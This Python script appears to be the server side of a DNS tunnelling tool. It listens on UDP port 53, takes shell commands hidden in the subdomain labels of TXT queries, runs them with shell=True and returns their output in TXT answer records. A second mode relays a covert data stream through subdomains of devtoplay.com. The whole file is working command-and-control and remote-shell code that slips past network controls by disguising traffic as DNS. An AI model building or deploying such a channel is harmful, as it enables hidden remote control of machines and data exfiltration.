#!/usr/bin/python3

import time
import sys
import os
import socket
import subprocess
from message import *
from process import Process
from stream import Stream

"""
splitRR split a string into an array of RR with the type t and a size of size bytes
and the ending sequence of our protocol (0000)
"""

def splitRR(string,t,size):
    a = []
    character_string = []
    
    for i in range(0,len(string),size): # Split into 255 char string
        s = string[i:i+size]
        
        if(s[len(s)-1:] == b'\x00'):
            s2 = (len(s) - 1).to_bytes(1,'big')
        else:
            s2 = len(s).to_bytes(1,'big') # Add the length of the string at the begining
            
        a.append(RR("",s2+s, t, 1, 0))

    return a

"""
Remove the salt at the begining of a command
return the command without the salt
"""

def removeSalt(s):
    i = 0
            
    while(s[i] >= "0" and s[i] <= "9"):
        i += 1

    return s[i:]

"""
run a shell command in a subprocess
return the process created
"""

def runCmd(cmd):

    
    if("cd" in cmd): # cd is a built-in command so we can't use subprocess
        path = cmd.split(' ')

        if(len(path) > 2):
            path = path[1]
        else:
            path = "/root/"
        
        os.chdir(path)
        cmd = "pwd" # Send the new path
        
    return Process(subprocess.Popen(cmd,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT,
                                    shell=True)) # Run command in a subprocess

def main():
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    if(len(sys.argv) == 2):
        serversocket.bind((sys.argv[1], 53))
    else:
        print("No ip adress found, socket bind on 127.0.0.1")
        serversocket.bind(("127.0.0.1",53))

    last = ""
    p = None
    type_RR = 16
    nb_bytes = 255
    answer_array = []
    answer,ns,additional = [],[],[]

    while True:
        data, ad = serversocket.recvfrom(4096)
        #print(data)
        q = bytesToMessage(data)

        cmd = q.qList[0].qname.split(".")
        
        if(cmd[0] != "devtoplay" and q.qList[0].qtype == type_RR):
            if(last != cmd[0] and p is None and len(answer_array) == 0):
                cmd[0] = cmd[0].replace("\x07",".") # . can't be in the domain name, so we replace them with '\x07'
                p = runCmd(removeSalt(cmd[0]))
                

        if "SIGINT" in cmd[0]: # Interrupt the process	 
            if(p is not None and not p.endProcess): # Kill the process
                p.kill()

            answer_array = []
            p = None
	    
        if(p is not None and not p.end): # If there is still something to read
            out = p.readstream() # Read the output of the process
            answer_array += splitRR(out,type_RR,nb_bytes) # Convert it into an array of RR
        else:
            p = None

        
        if(cmd[0] != last):	       
            if(len(answer_array) > 0): # Send the output of the command
                answer = [answer_array.pop(0)]
                answer[0].name = q.qList[0].qname
                if(answer[0].rdata == b''):
                    answer = []
            else: # Send default answer
                answer = []
       
        message = Message(
	    Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, len(answer), len(ns), len(additional)),
	    [Question(q.qList[0].qname,q.qList[0].qtype)],
	    answer+ns+additional)

        last = cmd[0]

        #print(message)
        #print(message.getBytes())

        serversocket.sendto(message.getBytes(), ad)
        print("end")

def mainStream():
    s = Stream()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    nb_bytes_salt = 4
    last_salt = ''
    last_message = b''

    if(len(sys.argv) == 2):
        sock.bind((sys.argv[1],53))
    else:
        sock.bind(("127.0.0.1",53))
    
    while(True):
        query, ad = sock.recvfrom(4096)
        query = bytesToMessage(query)
        #print(query.qList[0].qname,file=sys.stderr)
        data = query.qList[0].qname.split(".devtoplay.com")[0]
        salt = data[:nb_bytes_salt]
        #print(data)
        
        if(salt != last_salt):
            #print("not same", file=sys.stderr)
            if('you' in data):
                message = Message(Header(query.header.id,1,0,False,False,True,True,0,0,1,1,0,0),
                                  query.qList,
                                  [RR(query.qList[0].qname,writeTXT(s.read()),16,1,1)])
            else:
                message = defaultMessage(query)
                if(query.qList[0].qtype == 16 and data != 'devtoplay.com' and not 'nothing' in data):
                    split = data.split('.')
                    
                    data = ''
                    
                    for i in range(1,len(split),1):
                        data += insertPoint(split[i])
                    
                    sys.stdout.buffer.write(bytes(data,'latin-1'))
                    sys.stdout.flush()
        else:
            print("same",file=sys.stderr)
            message = last_message
            message.header.id = query.header.id

        print(message,file=sys.stderr)
        sock.sendto(message.getBytes(),ad)
        last_message = message
        last_salt = salt

if(__name__ == "__main__"):
    #main()
    mainStream()
    
        
